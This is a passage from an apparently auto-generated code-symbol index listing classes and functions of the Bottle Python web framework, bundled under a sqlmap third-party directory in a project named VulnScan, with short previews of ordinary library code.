        "label": "AiohttpServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AiohttpServer(AsyncioServerAdapter):\n    \"\"\" Asynchronous HTTP client/server framework for asyncio\n        https://pypi.python.org/pypi/aiohttp/\n        https://pypi.org/project/aiohttp-wsgi/\n    \"\"\"\n    def get_event_loop(self):\n        import asyncio\n        return asyncio.new_event_loop()\n    def run(self, handler):\n        import asyncio",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "AiohttpUVLoopServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AiohttpUVLoopServer(AiohttpServer):\n    \"\"\"uvloop\n       https://github.com/MagicStack/uvloop\n    \"\"\"\n    def get_event_loop(self):\n        import uvloop\n        return uvloop.new_event_loop()\nclass AutoServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n    adapters = [WaitressServer, PasteServer, TwistedServer, CherryPyServer,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "AutoServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AutoServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n    adapters = [WaitressServer, PasteServer, TwistedServer, CherryPyServer,\n                CherootServer, WSGIRefServer]\n    def run(self, handler):\n        for sa in self.adapters:\n            try:\n                return sa(self.host, self.port, **self.options).run(handler)\n            except ImportError:\n                pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "FileCheckerThread",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class FileCheckerThread(threading.Thread):\n    \"\"\" Interrupt main-thread as soon as a changed module file is detected,\n        the lockfile gets deleted or gets too old. \"\"\"\n    def __init__(self, lockfile, interval):\n        threading.Thread.__init__(self)\n        self.daemon = True\n        self.lockfile, self.interval = lockfile, interval\n        #: Is one of 'reload', 'error' or 'exit'\n        self.status = None\n    def run(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TemplateError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class TemplateError(BottleException):\n    pass\nclass BaseTemplate(object):\n    \"\"\" Base class and minimal API for template adapters \"\"\"\n    extensions = ['tpl', 'html', 'thtml', 'stpl']\n    settings = {}  #used in prepare()\n    defaults = {}  #used in render()\n    def __init__(self,\n                 source=None,\n                 name=None,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BaseTemplate",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class BaseTemplate(object):\n    \"\"\" Base class and minimal API for template adapters \"\"\"\n    extensions = ['tpl', 'html', 'thtml', 'stpl']\n    settings = {}  #used in prepare()\n    defaults = {}  #used in render()\n    def __init__(self,\n                 source=None,\n                 name=None,\n                 lookup=None,\n                 encoding='utf8', **settings):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "MakoTemplate",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class MakoTemplate(BaseTemplate):\n    def prepare(self, **options):\n        from mako.template import Template\n        from mako.lookup import TemplateLookup\n        options.update({'input_encoding': self.encoding})\n        options.setdefault('format_exceptions', bool(DEBUG))\n        lookup = TemplateLookup(directories=self.lookup, **options)\n        if self.source:\n            self.tpl = Template(self.source, lookup=lookup, **options)\n        else:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "CheetahTemplate",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class CheetahTemplate(BaseTemplate):\n    def prepare(self, **options):\n        from Cheetah.Template import Template\n        self.context = threading.local()\n        self.context.vars = {}\n        options['searchList'] = [self.context.vars]\n        if self.source:\n            self.tpl = Template(source=self.source, **options)\n        else:\n            self.tpl = Template(file=self.filename, **options)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Jinja2Template",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class Jinja2Template(BaseTemplate):\n    def prepare(self, filters=None, tests=None, globals={}, **kwargs):\n        from jinja2 import Environment, FunctionLoader\n        self.env = Environment(loader=FunctionLoader(self.loader), **kwargs)\n        if filters: self.env.filters.update(filters)\n        if tests: self.env.tests.update(tests)\n        if globals: self.env.globals.update(globals)\n        if self.source:\n            self.tpl = self.env.from_string(self.source)\n        else:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "SimpleTemplate",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class SimpleTemplate(BaseTemplate):\n    def prepare(self,\n                escape_func=html_escape,\n                noescape=False,\n                syntax=None, **ka):\n        self.cache = {}\n        enc = self.encoding\n        self._str = lambda x: touni(x, enc)\n        self._escape = lambda x: escape_func(touni(x, enc))\n        self.syntax = syntax",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "StplSyntaxError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class StplSyntaxError(TemplateError):\n    pass\nclass StplParser(object):\n    \"\"\" Parser for stpl templates. \"\"\"\n    _re_cache = {}  #: Cache for compiled re patterns\n    # This huge pile of voodoo magic splits python code into 8 different tokens.\n    # We use the verbose (?x) regex mode to make this more manageable\n    _re_tok = r'''(\n        [urbURB]*\n        (?:  ''(?!')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "StplParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class StplParser(object):\n    \"\"\" Parser for stpl templates. \"\"\"\n    _re_cache = {}  #: Cache for compiled re patterns\n    # This huge pile of voodoo magic splits python code into 8 different tokens.\n    # We use the verbose (?x) regex mode to make this more manageable\n    _re_tok = r'''(\n        [urbURB]*\n        (?:  ''(?!')\n            |\"\"(?!\")\n            |'{6}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "tob",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def tob(s, enc='utf8'):\n    if isinstance(s, unicode):\n        return s.encode(enc)\n    return b'' if s is None else bytes(s)\ndef touni(s, enc='utf8', err='strict'):\n    if isinstance(s, bytes):\n        return s.decode(enc, err)\n    return unicode(\"\" if s is None else s)\ntonat = touni if py3k else tob\ndef _stderr(*args):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "touni",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def touni(s, enc='utf8', err='strict'):\n    if isinstance(s, bytes):\n        return s.decode(enc, err)\n    return unicode(\"\" if s is None else s)\ntonat = touni if py3k else tob\ndef _stderr(*args):\n    try:\n        print(*args, file=sys.stderr)\n    except (IOError, AttributeError):\n        pass # Some environments do not allow printing (mod_wsgi)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "update_wrapper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def update_wrapper(wrapper, wrapped, *a, **ka):\n    try:\n        functools.update_wrapper(wrapper, wrapped, *a, **ka)\n    except AttributeError:\n        pass\n# These helpers are used at module level and need to be defined first.\n# And yes, I know PEP-8, but sometimes a lower-case classname makes more sense.\ndef depr(major, minor, cause, fix):\n    text = \"Warning: Use of deprecated feature or API. (Deprecated in Bottle-%d.%d)\\n\"\\\n           \"Cause: %s\\n\"\\",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "depr",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def depr(major, minor, cause, fix):\n    text = \"Warning: Use of deprecated feature or API. (Deprecated in Bottle-%d.%d)\\n\"\\\n           \"Cause: %s\\n\"\\\n           \"Fix: %s\\n\" % (major, minor, cause, fix)\n    if DEBUG == 'strict':\n        raise DeprecationWarning(text)\n    warnings.warn(text, DeprecationWarning, stacklevel=3)\n    return DeprecationWarning(text)\ndef makelist(data):  # This is just too handy\n    if isinstance(data, (tuple, list, set, dict)):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "makelist",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def makelist(data):  # This is just too handy\n    if isinstance(data, (tuple, list, set, dict)):\n        return list(data)\n    elif data:\n        return [data]\n    else:\n        return []\nclass DictProperty(object):\n    \"\"\" Property that maps to a key in a local dict-like attribute. \"\"\"\n    def __init__(self, attr, key=None, read_only=False):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "abort",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def abort(code=500, text='Unknown Error.'):\n    \"\"\" Aborts execution and causes a HTTP error. \"\"\"\n    raise HTTPError(code, text)\ndef redirect(url, code=None):\n    \"\"\" Aborts execution and causes a 303 or 302 redirect, depending on\n        the HTTP protocol version. \"\"\"\n    if not code:\n        code = 303 if request.get('SERVER_PROTOCOL') == \"HTTP/1.1\" else 302\n    res = response.copy(cls=HTTPResponse)\n    res.status = code",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "redirect",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def redirect(url, code=None):\n    \"\"\" Aborts execution and causes a 303 or 302 redirect, depending on\n        the HTTP protocol version. \"\"\"\n    if not code:\n        code = 303 if request.get('SERVER_PROTOCOL') == \"HTTP/1.1\" else 302\n    res = response.copy(cls=HTTPResponse)\n    res.status = code\n    res.body = \"\"\n    res.set_header('Location', urljoin(request.url, url))\n    raise res",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "static_file",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def static_file(filename, root,\n                mimetype=True,\n                download=False,\n                charset='UTF-8',\n                etag=None,\n                headers=None):\n    \"\"\" Open a file in a safe way and return an instance of :exc:`HTTPResponse`\n        that can be sent back to the client.\n        :param filename: Name or path of the file to send, relative to ``root``.\n        :param root: Root path for file lookups. Should be an absolute directory",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "debug",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def debug(mode=True):\n    \"\"\" Change the debug level.\n    There is only one debug level supported at the moment.\"\"\"\n    global DEBUG\n    if mode: warnings.simplefilter('default')\n    DEBUG = bool(mode)\ndef http_date(value):\n    if isinstance(value, basestring):\n        return value\n    if isinstance(value, datetime):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "http_date",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def http_date(value):\n    if isinstance(value, basestring):\n        return value\n    if isinstance(value, datetime):\n        # aware datetime.datetime is converted to UTC time\n        # naive datetime.datetime is treated as UTC time\n        value = value.utctimetuple()\n    elif isinstance(value, datedate):\n        # datetime.date is naive, and is treated as UTC time\n        value = value.timetuple()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "parse_date",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def parse_date(ims):\n    \"\"\" Parse rfc1123, rfc850 and asctime timestamps and return UTC epoch. \"\"\"\n    try:\n        ts = email.utils.parsedate_tz(ims)\n        return calendar.timegm(ts[:8] + (0, )) - (ts[9] or 0)\n    except (TypeError, ValueError, IndexError, OverflowError):\n        return None\ndef parse_auth(header):\n    \"\"\" Parse rfc2617 HTTP authentication header string (basic) and return (user,pass) tuple or None\"\"\"\n    try:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "parse_auth",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def parse_auth(header):\n    \"\"\" Parse rfc2617 HTTP authentication header string (basic) and return (user,pass) tuple or None\"\"\"\n    try:\n        method, data = header.split(None, 1)\n        if method.lower() == 'basic':\n            user, pwd = touni(base64.b64decode(tob(data))).split(':', 1)\n            return user, pwd\n    except (KeyError, ValueError):\n        return None\ndef parse_range_header(header, maxlen=0):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "parse_range_header",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def parse_range_header(header, maxlen=0):\n    \"\"\" Yield (start, end) ranges parsed from a HTTP Range header. Skip\n        unsatisfiable ranges. The end index is non-inclusive.\"\"\"\n    if not header or header[:6] != 'bytes=': return\n    ranges = [r.split('-', 1) for r in header[6:].split(',') if '-' in r]\n    for start, end in ranges:\n        try:\n            if not start:  # bytes=-100    -> last 100 bytes\n                start, end = max(0, maxlen - int(end)), maxlen\n            elif not end:  # bytes=100-    -> all but the first 99 bytes",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cookie_encode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def cookie_encode(data, key, digestmod=None):\n    \"\"\" Encode and sign a pickle-able object. Return a (byte) string \"\"\"\n    depr(0, 13, \"cookie_encode() will be removed soon.\",\n                \"Do not use this API directly.\")\n    digestmod = digestmod or hashlib.sha256\n    msg = base64.b64encode(pickle.dumps(data, -1))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=digestmod).digest())\n    return tob('!') + sig + tob('?') + msg\ndef cookie_decode(data, key, digestmod=None):\n    \"\"\" Verify and decode an encoded string. Return an object or None.\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cookie_decode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def cookie_decode(data, key, digestmod=None):\n    \"\"\" Verify and decode an encoded string. Return an object or None.\"\"\"\n    depr(0, 13, \"cookie_decode() will be removed soon.\",\n                \"Do not use this API directly.\")\n    data = tob(data)\n    if cookie_is_encoded(data):\n        sig, msg = data.split(tob('?'), 1)\n        digestmod = digestmod or hashlib.sha256\n        hashed = hmac.new(tob(key), msg, digestmod=digestmod).digest()\n        if _lscmp(sig[1:], base64.b64encode(hashed)):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cookie_is_encoded",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def cookie_is_encoded(data):\n    \"\"\" Return True if the argument looks like a encoded cookie.\"\"\"\n    depr(0, 13, \"cookie_is_encoded() will be removed soon.\",\n                \"Do not use this API directly.\")\n    return bool(data.startswith(tob('!')) and tob('?') in data)\ndef html_escape(string):\n    \"\"\" Escape HTML special characters ``&<>`` and quotes ``'\"``. \"\"\"\n    return string.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\\\n                 .replace('\"', '&quot;').replace(\"'\", '&#039;')\ndef html_quote(string):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "html_escape",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def html_escape(string):\n    \"\"\" Escape HTML special characters ``&<>`` and quotes ``'\"``. \"\"\"\n    return string.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\\\n                 .replace('\"', '&quot;').replace(\"'\", '&#039;')\ndef html_quote(string):\n    \"\"\" Escape and quote a string to be used as an HTTP attribute.\"\"\"\n    return '\"%s\"' % html_escape(string).replace('\\n', '&#10;')\\\n                    .replace('\\r', '&#13;').replace('\\t', '&#9;')\ndef yieldroutes(func):\n    \"\"\" Return a generator for routes that match the signature (name, args)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "html_quote",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def html_quote(string):\n    \"\"\" Escape and quote a string to be used as an HTTP attribute.\"\"\"\n    return '\"%s\"' % html_escape(string).replace('\\n', '&#10;')\\\n                    .replace('\\r', '&#13;').replace('\\t', '&#9;')\ndef yieldroutes(func):\n    \"\"\" Return a generator for routes that match the signature (name, args)\n    of the func parameter. This may yield more than one route if the function\n    takes optional keyword arguments. The output is best described by example::\n        a()         -> '/a'\n        b(x, y)     -> '/b/<x>/<y>'",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "yieldroutes",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def yieldroutes(func):\n    \"\"\" Return a generator for routes that match the signature (name, args)\n    of the func parameter. This may yield more than one route if the function\n    takes optional keyword arguments. The output is best described by example::\n        a()         -> '/a'\n        b(x, y)     -> '/b/<x>/<y>'\n        c(x, y=5)   -> '/c/<x>' and '/c/<x>/<y>'\n        d(x=5, y=6) -> '/d' and '/d/<x>' and '/d/<x>/<y>'\n    \"\"\"\n    path = '/' + func.__name__.replace('__', '/').lstrip('/')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "path_shift",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def path_shift(script_name, path_info, shift=1):\n    \"\"\" Shift path fragments from PATH_INFO to SCRIPT_NAME and vice versa.\n        :return: The modified paths.\n        :param script_name: The SCRIPT_NAME path.\n        :param script_name: The PATH_INFO path.\n        :param shift: The number of path fragments to shift. May be negative to\n          change the shift direction. (default: 1)\n    \"\"\"\n    if shift == 0: return script_name, path_info\n    pathlist = path_info.strip('/').split('/')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "auth_basic",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def auth_basic(check, realm=\"private\", text=\"Access denied\"):\n    \"\"\" Callback decorator to require HTTP auth (basic).\n        TODO: Add route(check_auth=...) parameter. \"\"\"\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*a, **ka):\n            user, password = request.auth or (None, None)\n            if user is None or not check(user, password):\n                err = HTTPError(401, text)\n                err.add_header('WWW-Authenticate', 'Basic realm=\"%s\"' % realm)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "make_default_app_wrapper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def make_default_app_wrapper(name):\n    \"\"\" Return a callable that relays calls to the current default app. \"\"\"\n    @functools.wraps(getattr(Bottle, name))\n    def wrapper(*a, **ka):\n        return getattr(app(), name)(*a, **ka)\n    return wrapper\nroute     = make_default_app_wrapper('route')\nget       = make_default_app_wrapper('get')\npost      = make_default_app_wrapper('post')\nput       = make_default_app_wrapper('put')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "load",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def load(target, **namespace):\n    \"\"\" Import a module or fetch an object from a module.\n        * ``package.module`` returns `module` as a module object.\n        * ``pack.mod:name`` returns the module variable `name` from `pack.mod`.\n        * ``pack.mod:func()`` calls `pack.mod.func()` and returns the result.\n        The last form accepts not only function calls, but any type of\n        expression. Keyword arguments passed to this function are available as\n        local variables. Example: ``import_string('re:compile(x)', x='[a-z]')``\n    \"\"\"\n    module, target = target.split(\":\", 1) if ':' in target else (target, None)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "load_app",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def load_app(target):\n    \"\"\" Load a bottle application from a module and make sure that the import\n        does not affect the current default application, but returns a separate\n        application object. See :func:`load` for the target parameter. \"\"\"\n    global NORUN\n    NORUN, nr_old = True, NORUN\n    tmp = default_app.push()  # Create a new \"default application\"\n    try:\n        rv = load(target)  # Import the target module\n        return rv if callable(rv) else tmp",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "run",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def run(app=None,\n        server='wsgiref',\n        host='127.0.0.1',\n        port=8080,\n        interval=1,\n        reloader=False,\n        quiet=False,\n        plugins=None,\n        debug=None,\n        config=None, **kargs):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "template",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def template(*args, **kwargs):\n    \"\"\"\n    Get a rendered template as a string iterator.\n    You can use a name, a filename or a template string as first parameter.\n    Template rendering arguments can be passed as dictionaries\n    or directly (as keyword arguments).\n    \"\"\"\n    tpl = args[0] if args else None\n    for dictarg in args[1:]:\n        kwargs.update(dictarg)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "view",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "def view(tpl_name, **defaults):\n    \"\"\" Decorator: renders a template for a handler.\n        The handler can control its behavior like that:\n          - return a dict of template vars to fill out the template\n          - return something other than a dict and the view decorator will not\n            process the template, but return the handler result as is.\n            This includes returning a HTTPResponse(dict) to get,\n            for instance, JSON with autojson or other castfilters.\n    \"\"\"\n    def decorator(func):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "__author__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "__author__ = 'Marcel Hellkamp'\n__version__ = '0.13-dev'\n__license__ = 'MIT'\n###############################################################################\n# Command-line interface ######################################################\n###############################################################################\n# INFO: Some server adapters need to monkey-patch std-lib modules before they\n# are imported. This is why some of the command-line handling is done here, but\n# the actual call to _main() is at the end of the file.\ndef _cli_parse(args):  # pragma: no coverage",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "__version__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "__version__ = '0.13-dev'\n__license__ = 'MIT'\n###############################################################################\n# Command-line interface ######################################################\n###############################################################################\n# INFO: Some server adapters need to monkey-patch std-lib modules before they\n# are imported. This is why some of the command-line handling is done here, but\n# the actual call to _main() is at the end of the file.\ndef _cli_parse(args):  # pragma: no coverage\n    from argparse import ArgumentParser",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "__license__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "__license__ = 'MIT'\n###############################################################################\n# Command-line interface ######################################################\n###############################################################################\n# INFO: Some server adapters need to monkey-patch std-lib modules before they\n# are imported. This is why some of the command-line handling is done here, but\n# the actual call to _main() is at the end of the file.\ndef _cli_parse(args):  # pragma: no coverage\n    from argparse import ArgumentParser\n    parser = ArgumentParser(prog=args[0], usage=\"%(prog)s [options] package.module:app\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "py",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "py = sys.version_info\npy3k = py.major > 2\n# Lots of stdlib and builtin differences.\nif py3k:\n    import http.client as httplib\n    import _thread as thread\n    from urllib.parse import urljoin, SplitResult as UrlSplitResult\n    from urllib.parse import urlencode, quote as urlquote, unquote as urlunquote\n    urlunquote = functools.partial(urlunquote, encoding='latin1')\n    from http.cookies import SimpleCookie, Morsel, CookieError",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "py3k",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "py3k = py.major > 2\n# Lots of stdlib and builtin differences.\nif py3k:\n    import http.client as httplib\n    import _thread as thread\n    from urllib.parse import urljoin, SplitResult as UrlSplitResult\n    from urllib.parse import urlencode, quote as urlquote, unquote as urlunquote\n    urlunquote = functools.partial(urlunquote, encoding='latin1')\n    from http.cookies import SimpleCookie, Morsel, CookieError\n    from collections.abc import MutableMapping as DictMixin",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "tonat",
        "kind": 5,
